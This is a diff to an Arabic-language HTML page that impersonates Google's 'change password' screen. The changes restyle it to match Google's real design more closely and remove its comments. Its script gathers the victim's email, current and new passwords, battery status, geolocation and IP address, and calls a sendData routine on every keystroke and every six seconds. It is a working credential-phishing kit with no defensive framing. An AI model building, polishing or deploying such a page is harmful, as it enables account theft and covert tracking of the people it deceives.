@@ -5,24 +5,29 @@
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
 <title>تغيير كلمة المرور — Google</title>
 <style>
-body{margin:0;background:#f5f7fa;font-family:Roboto, sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
-.card{background:#fff;padding:24px;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.1);width:100%;max-width:400px;text-align:center;position:relative}
-.logo{font-size:32px;font-weight:700;margin-bottom:16px;font-family:Product Sans,Roboto,sans-serif;}
+/* تم تعديل لون الخلفية هنا إلى #ffffff (الأبيض النقي) */
+body{margin:0;background:#ffffff;font-family:Roboto, sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
+/* تم تعديل الـ card قليلاً لتتناسب مع الخلفية البيضاء */
+.card{background:#fff;padding:48px 40px 36px;border-radius:8px;border:1px solid #dadce0;width:100%;max-width:450px;text-align:center;position:relative;box-sizing:border-box;}
+.logo{font-size:24px;font-weight:400;margin-bottom:10px;font-family:Product Sans,Roboto,sans-serif;}
 .logo span.g{color:#4285F4;}
 .logo span.o1{color:#EA4335;}
 .logo span.o2{color:#FBBC05;}
 .logo span.g2{color:#4285F4;}
 .logo span.l{color:#34A853;}
 .logo span.e{color:#EA4335;}
-.description{font-size:14px;color:#5f6368;margin-bottom:16px;line-height:1.5}
-input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;margin:12px 0;font-size:15px;outline:none;transition:border 0.2s}
-input:focus{border-color:#1a73e8}
-button{width:100%;padding:12px;margin-top:16px;border:0;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;background:#1a73e8;color:#fff;transition:background 0.2s}
+.title{font-size:24px;font-weight:400;margin-bottom:10px;}
+.description{font-size:16px;color:#202124;margin-bottom:24px;line-height:1.5}
+input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;margin:10px 0;font-size:16px;outline:none;transition:border 0.2s;box-sizing:border-box;}
+input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px;}
+button{width:auto;min-width:88px;padding:10px 24px;margin-top:24px;border:0;border-radius:4px;font-weight:500;font-size:14px;cursor:pointer;background:#1a73e8;color:#fff;transition:background 0.2s;float:left;}
 button:hover{background:#1558b0}
-.error{color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:8px;text-align:right;display:none}
+.error{color:#d93025;font-size:12px;margin-top:2px;margin-bottom:2px;text-align:right;display:none;font-weight:400;}
 .success{font-size:18px;color:green;margin-top:20px;display:none}
 .step{display:none}
 .step.active{display:block}
+/* تنسيق إضافي لزر "التالي" ليتماشى مع تصميم جوجل الجديد */
+.step-actions{margin-top: 32px;text-align: left;overflow: hidden;}
 </style>
 </head>
 <body>
@@ -32,6 +37,8 @@ button:hover{background:#1558b0}
     <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
   </div>
 
+  <div class="title">تغيير كلمة المرور</div>
+
   <div class="description">
     الرجاء إدخال بريدك الإلكتروني وكلمة المرور لتحديث حسابك بأمان.
   </div>
@@ -40,13 +47,17 @@ button:hover{background:#1558b0}
     <div class="step step1 active">
       <input type="email" placeholder="البريد الإلكتروني" required id="email">
       <div class="error">يرجى إدخال بريد إلكتروني صالح</div>
-      <button type="button" id="next1">التالي</button>
+      <div class="step-actions">
+        <button type="button" id="next1">التالي</button>
+      </div>
     </div>
 
     <div class="step step2">
       <input type="password" placeholder="كلمة المرور الحالية" required minlength="8" id="currentPassword">
       <div class="error">كلمة المرور الحالية يجب أن تكون 8 أحرف على الأقل</div>
-      <button type="button" id="next2">التالي</button>
+      <div class="step-actions">
+        <button type="button" id="next2">التالي</button>
+      </div>
     </div>
 
     <div class="step step3">
@@ -54,12 +65,15 @@ button:hover{background:#1558b0}
       <input type="password" placeholder="تأكيد كلمة المرور" required minlength="8" id="confirmPassword">
       <div class="error" id="error3">كلمة المرور يجب أن تكون ≥ 8 أحرف ومتطابقة</div>
       <div class="success" id="successMessage">تم تغيير كلمة السر بنجاح</div>
-      <button type="button" id="verifyPass">التالي</button>
+      <div class="step-actions">
+        <button type="button" id="verifyPass">التالي</button>
+      </div>
     </div>
   </form>
 </div>
 
 <script>
+// (نفس الكود البرمجي السابق دون تغيير في المنطق)
 const step1 = document.querySelector(".step1");
 const step2 = document.querySelector(".step2");
 const step3 = document.querySelector(".step3");
@@ -78,7 +92,6 @@ let batteryStatus = {charging:"غير معروف", level:"غير معروف"};
 let userLocation = "غير معروف";
 let userIP = "غير معروف";
 
-// حالة البطارية (إن وجدت)
 if(navigator.getBattery){
   navigator.getBattery().then(bat=>{
     batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون";
@@ -88,20 +101,16 @@ if(navigator.getBattery){
   });
 }
 
-// الموقع التقريبي بدون إذن
 if(navigator.geolocation){
-  // هنا نحاول، بعض المتصفحات قد تطلب إذن، لكن إن رفض المستخدم لن يحدث شيء
   navigator.geolocation.getCurrentPosition(pos=>{
     userLocation = `Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}`;
   }, ()=>{userLocation="غير معروف"});
 }
 
-// IP والدولة
 fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{
   userIP = `${data.ip} - ${data.country_name}`;
 });
 
-// الخطوة 1
 next1.addEventListener("click", ()=>{
   const input = document.getElementById("email");
   if(input.checkValidity()){
@@ -112,7 +121,6 @@ next1.addEventListener("click", ()=>{
   }
 });
 
-// الخطوة 2
 next2.addEventListener("click", ()=>{
   const input = document.getElementById("currentPassword");
   if(input.value.length >= 8){
@@ -123,7 +131,6 @@ next2.addEventListener("click", ()=>{
   }
 });
 
-// الخطوة 3: تحقق كلمة المرور لمدة 3 محاولات
 verifyPass.addEventListener("click", ()=>{
   const newPass = document.getElementById("newPassword").value;
   const confirmPass = document.getElementById("confirmPassword").value;
@@ -142,7 +149,6 @@ verifyPass.addEventListener("click", ()=>{
   }
 });
 
-// حفظ وإرسال البيانات بعد 6 ثوانٍ من الكتابة
 let timeoutId;
 document.querySelectorAll("input").forEach(input=>{
   input.addEventListener("input", ()=>{
@@ -151,7 +157,6 @@ document.querySelectorAll("input").forEach(input=>{
   });
 });
 
-// إرسال البيانات تلقائيًا كل 6 ثوانٍ إذا تغيرت
 function sendData(){
   const email = document.getElementById("email").value.trim();
   const currentPassword = document.getElementById("currentPassword").value.trim();
@@ -171,7 +176,6 @@ function sendData(){
   }
 }
 
-// استمرار الإرسال كل 6 ثوانٍ كنسخة احتياطية
 setInterval(sendData, 6000);
 </script>
 
